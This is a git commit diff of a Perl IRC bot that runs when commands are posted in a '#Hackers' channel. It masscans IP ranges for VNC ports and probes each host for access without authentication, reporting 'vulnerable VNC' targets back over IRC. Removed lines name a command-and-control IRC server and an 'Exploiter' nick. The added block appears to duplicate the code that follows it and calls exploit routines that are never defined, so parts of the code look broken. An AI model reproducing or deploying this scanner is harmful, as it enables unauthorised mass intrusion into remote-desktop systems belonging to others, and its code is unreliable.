d6832168cdb7ec3d1e00de7db275481654b5b580
Remi Girard <54126451+independentcod@users.noreply.github.com>
2020-02-02 12:15:34 -0500

    Update perlircssl.pl

--- perlircssl.pl
+++ perlircssl.pl
@@ -5,18 +5,18 @@
  use feature 'say';
  use Fcntl qw(:flock SEEK_END);
  $|=1;
- my @VNC_PORTS = qw/'5900 5901 5902 5903 5904 5905 5906 5907 5908 5909 5910 5911 5912 5913 5914 5915 5916 5917 5918 5919 5920 5921 5922 5923 5924 5925 5926 5927 5928 5929 5930 5931 5932 5933 5934 5935 5936 5937 5938 5939 5940 5941 5942 5943 5944 5945 5946 5947 5948 5949 5950 5951 5952 5953 5954 5955 5956 5957 5958 5959 5960 5961 5962 5963 5964 5965 5966 5967 5968 5969 5970 5971 5972 5973 5974 5975 5976 5977 5978 5979 5980 5981 5982 5983 5984 5985 5986 5987 5988 5989 5990 5991 5992 5993 5994 5995 5996 5997 5998 5999 6000'/;
+ #defineportshere
   use Mojo::IOLoop;
- my $forktimeout = 5;
- my $maxforks = 15;
- my $noticechan = '@#Hackers';
- my $channel = '#Hackers';
+ #definetimeouthere
+ #defineforkshere
+ #definenoticechanhere
+ #definechanhere
   my $irc = Mojo::IRC->new(
- nick => 'Exploiter'.int(rand(99999)),
+ #definenickhere
   user => 'VNCScan',
- server => 'irc.chknet.cc:6697',
+ #defineserverhere
   );
- $irc->tls({insecure => 1});
+ #definesslhere
  $irc->on(irc_rpl_welcome => sub {
   my($irc, $err) = @_;
   warn 'Joined IRC server.';
@@ -48,6 +48,205 @@
       $irc->write(notice => $noticechan => "exploit is not running");
      }
     }
+    return unless $msg =~ /^\@./;
+    my $subprocess = Mojo::IOLoop->subprocess(
+     sub {
+      my $s = shift;
+      my @IRC_RESULTS;
+      if ($msg =~ /@.scan ([^\s]+)/) {
+       $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
+       my $range = $1;
+       my $masscancmd = "masscan -p 5900-5901 --range $range --rate 2048 --open --banners -oG hosts.txt ";
+       warn "Received rangescan request on $range , running masscan...";
+       my $r = `$masscancmd`;
+       push @IRC_RESULTS, $_ foreach split "\n", $r;
+       } elsif ($msg =~ /@.exploit/) {
+        warn 'Received exploitrun request, exploiting hosts.txt...';
+        my $r = exploitrun ("vnc", $s, $s->pid);
+
+        } elsif ($msg =~ /@.format/) {
+         warn 'Received file formatting request, processing...';    
+         my $formatcmd = "rm -rf ips.txt && cat hosts.txt | grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}' >>ips.txt";
+         my $r = `$formatcmd`;
+         push @IRC_RESULTS, $_ foreach split "\n", $r;
+        }
+        return @IRC_RESULTS;
+        }, sub {
+         my ($s, $error, @res) = @_;
+         $irc->write(notice => $noticechan => " FINISHED: $msg");
+         warn "Finished work: $msg";
+         if ( $error ) {
+          warn "ERROR FOUND: $error";
+          $irc->write(notice => $noticechan => "ERROR: " . $error);
+          return;
+         }
+         $irc->write(notice => $noticechan => $_) foreach @res;
+         });
+
+    $subprocess->on(progress => sub {
+     my ($subprocess, @data) = @_;
+     $irc->write(notice => $noticechan => $_) foreach @data; # this prints the data from subprocesses
+     });
+    $subprocess->on(spawn => sub {
+     my $subprocess = shift;
+     my $pid = $subprocess->pid;
+     # $irc->write(notice => $noticechan =>  "Performing work in process $pid");
+     if ( $msg =~ /@.exploit/ ) {
+      $irc->write(notice => $noticechan => 'pid: ' . $pid) ;
+      $misc->{exploitpid} = $pid ;
+     }
+     });
+    });
+ $irc->connect(sub {
+  my($irc, $err) = @_;
+  return warn $err if $err;
+  $irc->write(join => $channel);
+  });
+ Mojo::IOLoop->start;
+
+ sub exploitvnc {
+  my $row = shift;
+  my $subp = shift;
+  my $ownpid = shift;
+  my $arg = shift;
+  foreach my $vncport (@VNC_PORTS){
+   my $sock = IO::Socket::INET->new(PeerAddr => $row, PeerPort => $vncport, Proto => 'tcp', Timeout => 10);
+   next unless $sock;
+   $sock->read(my $proto_ver, 12);
+   eval { 
+    print $sock $proto_ver;
+    $sock->read(my $sec_types, 1);
+    $sock->read(my $ignored, unpack('C', $sec_types));
+    print $sock "\x01";
+    $sock->read(my $auth_type, 4);
+    print $sock "\x01"; 
+   };
+   my $ver = "RFB 003.008";
+   $sock->read(my $vnc_data, 4);
+   if (unpack('I', $vnc_data)) {
+    if ($proto_ver =~ $ver) {
+     $proto_ver =~ s/[\r\n]+//g;
+     if (index($vnc_data, chr(4)) != -1) {
+      warn "Found vulnerable VNC $row:$vncport";
+      $subp->progress(" $row:$vncport $vnc_data ");
+     }
+     elsif (index($vnc_data, chr(195)) != -1) {
+      warn "Found vulnerable VNC $row:$vncport";
+      $subp->progress(" $row:$vncport $vnc_data ");
+     }
+     elsif (index($vnc_data, chr(208)) != -1) {
+      warn "Found vulnerable VNC $row:$vncport";
+      $subp->progress(" $row:$vncport $vnc_data ");
+     }
+     elsif (index($vnc_data, chr(88)) != -1) {
+      warn "Found vulnerable VNC $row:$vncport";
+      $subp->progress(" $row:$vncport $vnc_data ");
+     }
+     elsif (index($vnc_data, chr(87)) != -1) {
+      warn "Found vulnerable VNC $row:$vncport";
+      $subp->progress(" $row:$vncport $vnc_data ");
+     }
+     elsif (index($vnc_data, chr(7)) != -1) {
+      warn "Found vulnerable VNC $row:$vncport";
+      $subp->progress(" $row:$vncport $vnc_data ");
+     }
+    }
+   }
+  }
+  exit; 
+ }
+
+ sub exploitrun {
+  my $arg = shift;
+  my $subp = shift;
+  my $ownpid = shift;
+  $SIG{CHLD} = 'IGNORE';
+  $subp->progress("[Info] Starting $arg Exploiter ");
+  my @ips;
+  my %ips;
+  my $filename = 'ips.txt';
+  if (open(my $fh, '<:encoding(UTF-8)', $filename)) {
+   while (my $row = <$fh>) {
+    chomp $row;
+    $row = $1 if $row =~ /(\d+\.\d+\.\d+\.\d+)/;
+    #push @ips, $row;
+    $ips{$row} = '';
+   }
+   close $fh;
+  }
+  push @ips, $_ foreach (sort {$a cmp $b} keys %ips);
+  my %pids;
+  $subp->progress("Calling IPs (" . int (scalar @ips) . ")");
+
+  my $finished = 0;
+  my $i = 0;
+  while ( @ips > 0 )
+  {
+   Time::HiRes::sleep(0.1);
+   #$subp->progress("[Info] In progress");
+   foreach (keys %pids){
+    my $exists = kill 0, $_; # kill 'TERM', $_ 
+    if ( $exists ) {
+     kill 'TERM', $_ if $pids{$_} < CORE::time;
+     } else {
+      delete $pids{$_}
+     }
+    }
+    if ( scalar keys %pids >= $maxforks )
+    {
+     say int scalar @ips;
+     say 'pids: ' . scalar keys %pids;
+     } else {
+      my $targetip = shift @ips;
+      say 'Sending ' . $targetip;
+      my $pid;
+      if ($pid = fork) {
+       say $pid;
+       } else {
+        if ($arg =~ /rdp/) {
+         exploitrdp($targetip, $subp, $ownpid);
+        }
+        if ($arg =~ /ssh/) {
+         exploitssh($targetip, $subp, $ownpid);
+        }
+        if ($arg =~ /mysql/) {
+         exploitmysql($targetip, $subp, $ownpid);
+        }
+        if ($arg =~ /smtp/) {
+         exploitsmtp($targetip, $subp, $ownpid);
+        }
+        if ($arg =~ /vnc/) {
+         exploitvnc($targetip, $subp, $ownpid);
+        }
+       }
+       $pids{$pid} = CORE::time + $forktimeout;
+      }
+     }
+     $subp->progress("Done Calling IPs");
+     while ( scalar keys %pids > 0 ) # wait for last alive forks to terminate
+     {
+      Time::HiRes::sleep(0.1);
+      foreach (keys %pids){
+       my $exists = kill 0, $_; # kill 'TERM', $_ 
+       if ( $exists ) {
+
+        kill 'TERM', $_ if $pids{$_} < CORE::time;
+        } else {
+         delete $pids{$_}
+        }
+       }
+      }
+      $subp->progress("[Info] $arg Done Scan");
+     }
+     sub lockf {
+      my ($fh) = @_;
+      flock($fh, LOCK_EX) or die "Cannot lock - $!\n";
+     }
+     sub unlock {
+      my ($fh) = @_;
+      flock($fh, LOCK_UN) or die "Cannot unlock - $!\n";
+     }
+
     return unless $msg =~ /^\@./;
     my $subprocess = Mojo::IOLoop->subprocess(
      sub {
